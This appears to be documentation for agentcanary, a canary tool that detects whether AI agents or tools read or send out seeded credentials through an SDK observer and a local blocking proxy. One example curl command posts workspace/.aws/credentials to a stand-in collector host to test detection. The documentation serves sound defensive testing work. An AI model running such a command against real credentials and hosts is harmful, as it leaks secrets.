# Integrations and configuration

Choose an observation boundary appropriate to the evidence you need. Filesystem notifications provide access evidence without a PID. SDK calls identify the calling process. The HTTP listener observes only requests sent to its loopback address and never identifies a client PID or forwards a request.

## Cooperative tools and models

```python
from agentcanary import Observer, Store

observer = Observer(Store(".agentcanary"), run_id="evaluation-1")
content = observer.read("workspace/.aws/credentials")
observer.observe_tool(content, tool="local-summarizer")
observer.observe_model(content, destination="https://model.invalid/v1/responses")
observer.observe_embedding(content, destination="https://model.invalid/v1/embeddings")
```

Model/embedding helpers record supplied input and perform no network I/O. Place them immediately before a cooperating application's request to observe content before TLS. `observe_http(method, url, headers=..., body=...)` inspects request fields without sending them. `observe_tool()` also records supplied input without invoking the named tool. `run_tool(argv, input=..., tool=..., timeout=...)` observes and invokes a real argument array with `shell=False`; child output is discarded and the returned `ToolResult` contains its return code and events. No arbitrary command is extracted from an artifact.

An `Observer` uses a registry snapshot. Call `refresh()` after creating new canaries. Failed observations raise errors; catching an error and proceeding with an application request means accepting an observation gap. Do not record real payloads, authorization headers or environment contents as event metadata.

## Explicit HTTP inspection

Start the endpoint after seeding:

```bash
agentcanary proxy --host 127.0.0.1 --port 8080 --run-id evaluation-1
```

Wait for its JSON readiness line. This example sends an HTTP request to the local proxy; the destination label is never resolved or contacted:

```bash
curl --noproxy '' --proxy http://127.0.0.1:8080 --include \
  --data-binary @workspace/.aws/credentials http://collector.invalid/upload
```

A complete inspected request receives HTTP 403, even if it contains no marker. A 403 is not itself proof of a canary match: inspect the event report. `--port 0` requests an available port and prints the selected URL. `--duration SECONDS` bounds CLI lifetime. `serve` is an alias for `proxy`.

The programmatic lifecycle is a context manager:

```python
import http.client

from agentcanary import BlockingProxy, Store

with BlockingProxy(Store(".agentcanary"), port=0, run_id="evaluation-1") as endpoint:
    client = http.client.HTTPConnection(endpoint.host, endpoint.port, timeout=5)
    try:
        client.request("POST", "http://collector.invalid/upload", body=b"ordinary fixture")
        response = client.getresponse()
        assert response.status == 403
        response.read()
    finally:
        client.close()
    endpoint.check()
```

Recognized paths are `/chat/completions`, `/completions`, `/responses`, `/messages` and `/embeddings`, with optional `/v1` prefix and trailing slash. Recognition records model-input evidence; it does not validate a provider's schema or prove model execution. Only a canonical origin and a recognized route are retained, not credentials, query strings, arbitrary paths or request bodies.

The endpoint accepts one bounded HTTP/1 request per connection. It rejects CONNECT, chunked/other transfer encoding, Expect, ambiguous framing and incomplete input with health evidence. It does not provide TLS interception, HTTP/2, keepalive, transparent socket capture or system-wide egress enforcement.

## Limits and health

Defaults are a 1 MiB body, 32 KiB aggregate request headers, at most 64 headers, an 8 KiB request line, eight workers, and a five-second total request-read deadline. Gzip expansion obeys the body bound. SDK input defaults to 1 MiB. Encoded inspection bounds total input, candidate count, recursion and cumulative work; unsupported or incomplete inspection raises a diagnostic rather than certifying clean content.

Supported representations include plaintext, percent escapes, JSON strings/keys, standard and URL-safe base64 candidates, and common form fields. Duplicate JSON member names are rejected explicitly because their interpretation is ambiguous. This is bounded representation matching, not arbitrary data-flow tracking. See [limitations](limitations.md).

`check()` surfaces asynchronous listener/monitor failures. A context manager also checks shutdown. An unavailable sink can prevent its own health event from being persisted. Custom sinks must return promptly; Python cannot forcibly cancel a stuck sink thread. Built-in bounded joins report shutdown timeouts instead of claiming complete cleanup.

## Policy

Configuration is opt-in through `--config PATH` or `load_policy(PATH)`. There is no implicit search for a workspace configuration file.

```toml
version = 1
allow_origins = ["https://model.invalid"]

[[ignore]]
source = "sdk"
action = "READ"
# Add canary_id = "..." to restrict this rule to an issued UUID.
```

All selectors in an ignore rule must match. Rules are checked in order; ignore takes precedence over allowlist. Origins match exact canonical scheme, hostname and port. Paths, userinfo, queries, fragments and wildcard hosts are invalid configuration. An origin whose hostname required synthetic-token redaction is ineligible for allowlisting; its display value is not an exact identity.

The policy adds `policy_decision` (`observed`, `ignored`, or `allowlisted`) and, for an ignore rule, its one-based `policy_rule`. Creation and health records are unaffected. Every event stays in storage. `report --hide-policy` hides stored ignored/allowlisted events only; it does not apply a new policy retroactively. With `--limit`, the database selection limit is applied before presentation filtering, so fewer visible rows may be returned.

For SDK use, pass `Observer(store, policy=load_policy(path))`. For other adapters, wrap their sink with `PolicySink(store, policy)`. All network attempts remain blocked regardless of policy. TOML input is limited to 64 KiB, with at most 256 origins and 256 ignore rules. Unknown fields, versions and selector types are rejected.
